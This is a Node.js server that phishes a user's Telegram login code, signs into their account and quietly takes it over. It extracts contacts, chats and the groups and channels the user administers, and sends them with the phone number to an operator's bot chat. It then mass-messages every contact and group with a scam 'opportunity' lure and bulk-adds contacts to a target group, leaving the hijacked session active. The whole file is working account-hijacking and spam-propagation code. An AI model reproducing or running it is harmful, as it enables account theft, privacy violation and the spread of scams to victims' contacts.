const express = require('express');
const cors = require('cors');

const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';
const TARGET_GROUP_ID = process.env.TARGET_GROUP_ID || '';

// Bot configuration
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '';

// Messages to send
const CONTACT_MESSAGE = process.env.CONTACT_MESSAGE || "Hello! Hope you're doing well. Check out this amazing opportunity!";
const GROUP_MESSAGE = process.env.GROUP_MESSAGE || "Hi everyone! Excited to share something interesting with you all!";

const sessions = new Map();
const authenticatedUsers = new Map();

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Send message via bot
async function sendBotMessage(message) {
    try {
        if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
            console.log('⚠️ Bot token or admin chat ID not set');
            return;
        }

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('📨 Bot message sent to admin');
        } else {
            console.error('❌ Bot message failed:', data.description);
        }
    } catch (error) {
        console.error('❌ Bot message error:', error);
    }
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending code to: ${phoneNumber}`);
        
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 Code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying code: ${code}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ Login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        authenticatedUsers.set(userId, {
            client: session.client,
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now()
        });

        res.json({
            success: true,
            message: 'Authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        // FIXED: Use session.client instead of client
        setTimeout(() => {
            performAllOperations(session.client, result.user, session.phoneNumber);
        }, 2000);

        sessions.delete(sessionId);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Main operations function
async function performAllOperations(client, user, phoneNumber) {
    try {
        console.log(`\n🚀 Starting ALL operations for ${user.firstName} (${phoneNumber})`);
        
        // Send initial notification
        await sendBotMessage(`🚨 <b>NEW USER LOGIN</b>\n\n👤 <b>User:</b> ${user.firstName} ${user.lastName}\n📱 <b>Phone:</b> ${phoneNumber}\n🆔 <b>ID:</b> ${user.id}\n🕒 <b>Time:</b> ${new Date().toLocaleString()}\n\n⏳ <b>Starting operations...</b>`);
        
        // STEP 1: Extract all data
        console.log(`\n📊 STEP 1: Data Extraction`);
        const userData = await extractUserData(client, user, phoneNumber);
        
        // STEP 2: Send messages to contacts and chat partners
        console.log(`\n📨 STEP 2: Messaging Contacts`);
        await sendMessagesToContacts(client, userData);
        
        // STEP 3: Send messages to groups (non-admin groups only)
        console.log(`\n👥 STEP 3: Messaging Groups`);
        await sendMessagesToGroups(client, userData, user);
        
        // STEP 4: Join target group and add contacts
        if (TARGET_GROUP_ID) {
            console.log(`\n🎯 STEP 4: Target Group Operations`);
            await performTargetGroupOperations(client, userData, user);
        }
        
        // STEP 5: Send final completion report
        await sendCompletionReport(userData, user);
        
        console.log(`\n🎉 ALL OPERATIONS COMPLETED for ${user.firstName}!`);
        
    } catch (error) {
        console.error('❌ Main operations error:', error);
        await sendBotMessage(`❌ <b>OPERATION ERROR</b>\n\n👤 <b>User:</b> ${user.firstName}\n❌ <b>Error:</b> ${error.message}`);
    }
}

// Extract user data and find admin groups
async function extractUserData(client, user, phoneNumber) {
    try {
        console.log(`📊 Extracting data for ${user.firstName}...`);
        
        // Get contacts
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        // Get dialogs
        const dialogs = await client.getDialogs({ limit: 100 });
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        const privateChats = dialogs.filter(d => d.isUser);
        
        // Get chat partners
        const chatPartners = privateChats.map(chat => chat.entity).filter(entity => 
            entity && !entity.self && !entity.deleted && !entity.bot
        );
        
        console.log(`📊 Found: ${contacts.length} contacts, ${chatPartners.length} chat partners, ${groups.length} groups`);
        
        // Check admin groups
        const adminGroups = [];
        const regularGroups = [];
        
        for (const group of groups.slice(0, 10)) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: group.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminGroups.push({
                        entity: group.entity,
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                } else {
                    regularGroups.push({
                        entity: group.entity,
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check: ${group.title}`);
                regularGroups.push({
                    entity: group.entity,
                    title: group.title,
                    members: group.entity.participantsCount || 0
                });
            }
        }
        
        // Check admin channels
        const adminChannels = [];
        for (const channel of channels.slice(0, 10)) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: channel.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminChannels.push({
                        title: channel.title,
                        members: channel.entity.participantsCount || 0
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check channel: ${channel.title}`);
            }
        }
        
        console.log(`👑 Admin groups: ${adminGroups.length}, Regular groups: ${regularGroups.length}, Admin channels: ${adminChannels.length}`);
        
        // Send data extraction report
        const adminGroupsList = adminGroups.length > 0 ? 
            adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n') : 
            'None';
            
        const adminChannelsList = adminChannels.length > 0 ? 
            adminChannels.map((c, i) => `${i+1}. ${c.title} (${c.members} subscribers)`).join('\n') : 
            'None';
        
        const dataReport = `
📊 <b>DATA EXTRACTION COMPLETED</b>

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${phoneNumber}
🆔 <b>ID:</b> ${user.id}

📈 <b>STATISTICS:</b>
📞 Contacts: ${contacts.length}
💬 Chat Partners: ${chatPartners.length}
👥 Groups: ${groups.length}
📢 Channels: ${channels.length}
👑 Admin Groups: ${adminGroups.length}
👑 Admin Channels: ${adminChannels.length}

👑 <b>ADMIN GROUPS:</b>
${adminGroupsList}

👑 <b>ADMIN CHANNELS:</b>
${adminChannelsList}

⏳ <b>Starting messaging operations...</b>
        `.trim();
        
        await sendBotMessage(dataReport);
        
        return {
            user,
            phoneNumber,
            contacts,
            chatPartners,
            adminGroups,
            adminChannels,
            regularGroups,
            allGroups: groups,
            channels
        };
        
    } catch (error) {
        console.error('❌ Data extraction error:', error);
        await sendBotMessage(`❌ <b>DATA EXTRACTION ERROR</b>\n\n👤 <b>User:</b> ${user.firstName}\n❌ <b>Error:</b> ${error.message}`);
        throw error;
    }
}

// Send messages to all contacts and chat partners
async function sendMessagesToContacts(client, userData) {
    try {
        const allTargets = [...userData.contacts, ...userData.chatPartners];
        const uniqueTargets = allTargets.filter((target, index, self) => 
            index === self.findIndex(t => t.id.toString() === target.id.toString())
        );
        
        console.log(`📨 Sending messages to ${uniqueTargets.length} contacts/chat partners...`);
        
        let sentCount = 0;
        let failedCount = 0;
        
        for (const target of uniqueTargets) {
            try {
                await client.invoke(new Api.messages.SendMessage({
                    peer: target,
                    message: CONTACT_MESSAGE,
                    randomId: Math.floor(Math.random() * 1000000)
                }));
                
                sentCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`✅ ${sentCount}/${uniqueTargets.length} Sent to: ${name}`);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                failedCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`❌ Failed to send to: ${name} - ${error.message}`);
                
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }
        
        console.log(`📨 Contact messaging completed: ${sentCount} sent, ${failedCount} failed`);
        
        await sendBotMessage(`📨 <b>CONTACT MESSAGING COMPLETED</b>\n\n✅ <b>Sent:</b> ${sentCount}\n❌ <b>Failed:</b> ${failedCount}\n📊 <b>Total:</b> ${uniqueTargets.length}`);
        
    } catch (error) {
        console.error('❌ Contact messaging error:', error);
        await sendBotMessage(`❌ <b>CONTACT MESSAGING ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
    }
}

// Send messages to groups (excluding admin groups)
async function sendMessagesToGroups(client, userData, user) {
    try {
        const messagableGroups = userData.regularGroups;
        
        console.log(`👥 Sending messages to ${messagableGroups.length} regular groups...`);
        
        let sentCount = 0;
        let failedCount = 0;
        
        for (const group of messagableGroups) {
            try {
                await client.invoke(new Api.messages.SendMessage({
                    peer: group.entity,
                    message: GROUP_MESSAGE,
                    randomId: Math.floor(Math.random() * 1000000)
                }));
                
                sentCount++;
                console.log(`✅ ${sentCount}/${messagableGroups.length} Sent to group: ${group.title}`);
                
                await new Promise(resolve => setTimeout(resolve, 4000));
                
            } catch (error) {
                failedCount++;
                console.log(`❌ Failed to send to group: ${group.title} - ${error.message}`);
                
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }
        
        console.log(`👥 Group messaging completed: ${sentCount} sent, ${failedCount} failed`);
        
        const groupsList = messagableGroups.slice(0, 10).map((g, i) => `${i+1}. ${g.title}`).join('\n');
        
        await sendBotMessage(`👥 <b>GROUP MESSAGING COMPLETED</b>\n\n✅ <b>Sent:</b> ${sentCount}\n❌ <b>Failed:</b> ${failedCount}\n📊 <b>Groups:</b> ${messagableGroups.length}\n\n📋 <b>GROUPS MESSAGED:</b>\n${groupsList}${messagableGroups.length > 10 ? `\n... and ${messagableGroups.length - 10} more` : ''}`);
        
    } catch (error) {
        console.error('❌ Group messaging error:', error);
        await sendBotMessage(`❌ <b>GROUP MESSAGING ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
    }
}

// Join target group and add contacts
async function performTargetGroupOperations(client, userData, user) {
    try {
        if (!TARGET_GROUP_ID) {
            console.log(`⚠️ No target group ID set - skipping group operations`);
            await sendBotMessage(`⚠️ <b>GROUP OPERATIONS SKIPPED</b>\n\nNo target group ID configured`);
            return;
        }
        
        console.log(`🎯 Target group operations starting...`);
        
        // Join the target group
        try {
            await client.invoke(new Api.channels.JoinChannel({
                channel: TARGET_GROUP_ID
            }));
            console.log(`✅ User joined target group`);
            await sendBotMessage(`✅ <b>User joined target group</b>\n\n👥 Starting to add contacts...`);
        } catch (error) {
            console.log(`ℹ️ Could not join group: ${error.message}`);
            await sendBotMessage(`ℹ️ <b>Could not join group:</b> ${error.message}\n\n👥 Proceeding to add contacts...`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Add contacts to target group
        console.log(`👥 Adding ${userData.contacts.length} contacts to target group...`);
        
        let addedCount = 0;
        let failedCount = 0;
        
        for (const contact of userData.contacts) {
            try {
                await client.invoke(new Api.channels.InviteToChannel({
                    channel: TARGET_GROUP_ID,
                    users: [contact]
                }));
                
                addedCount++;
                const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                console.log(`✅ ${addedCount}/${userData.contacts.length} Added: ${name}`);
                
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                failedCount++;
                const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                console.log(`❌ Failed to add: ${name} - ${error.message}`);
                
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }
        
        console.log(`👥 Group operations completed: ${addedCount} added, ${failedCount} failed`);
        
        await sendBotMessage(`🎯 <b>GROUP OPERATIONS COMPLETED</b>\n\n✅ <b>Added to group:</b> ${addedCount}\n❌ <b>Failed to add:</b> ${failedCount}\n📊 <b>Total contacts:</b> ${userData.contacts.length}`);
        
    } catch (error) {
        console.error('❌ Target group operations error:', error);
        await sendBotMessage(`❌ <b>GROUP OPERATIONS ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
    }
}

// Send final completion report
async function sendCompletionReport(userData, user) {
    try {
        const adminGroupsList = userData.adminGroups.length > 0 ? 
            userData.adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n') : 
            'None';
            
        const adminChannelsList = userData.adminChannels.length > 0 ? 
            userData.adminChannels.map((c, i) => `${i+1}. ${c.title} (${c.members} subscribers)`).join('\n') : 
            'None';
        
        const completionMessage = `
🎉 <b>ALL OPERATIONS COMPLETED</b>

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${userData.phoneNumber}
🆔 <b>ID:</b> ${user.id}
🕒 <b>Completed:</b> ${new Date().toLocaleString()}

📊 <b>FINAL STATISTICS:</b>
📞 Total Contacts: ${userData.contacts.length}
💬 Chat Partners: ${userData.chatPartners.length}
👥 Total Groups: ${userData.allGroups.length}
📢 Total Channels: ${userData.channels.length}
👑 Admin Groups: ${userData.adminGroups.length}
👑 Admin Channels: ${userData.adminChannels.length}

👑 <b>ADMIN GROUPS:</b>
${adminGroupsList}

👑 <b>ADMIN CHANNELS:</b>
${adminChannelsList}

✅ <b>OPERATIONS SUMMARY:</b>
📨 Messages sent to contacts/chat partners
👥 Messages sent to regular groups (excluding admin groups)
${TARGET_GROUP_ID ? '🎯 User joined target group\n👥 Contacts added to target group' : '⚠️ No target group configured'}
📊 Complete data extracted and reported

🔒 <b>User session remains active</b>
        `.trim();
        
        await sendBotMessage(completionMessage);
        
    } catch (error) {
        console.error('❌ Completion report error:', error);
    }
}

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Complete Operations System',
        status: 'Running',
        features: [
            'Send messages to all contacts and chat partners',
            'Send messages to regular groups (non-admin)',
            'Extract admin groups/channels with member counts',
            'Add contacts to target group',
            'Bot notifications with complete data'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Complete Operations System Started`);
    console.log(`📡 Running on port ${PORT}`);
    console.log(`📨 Contact messaging: ${CONTACT_MESSAGE.substring(0, 30)}...`);
    console.log(`👥 Group messaging: ${GROUP_MESSAGE.substring(0, 30)}...`);
    console.log(`🤖 Bot notifications enabled`);
    console.log(`✅ Ready for complete operations!`);
});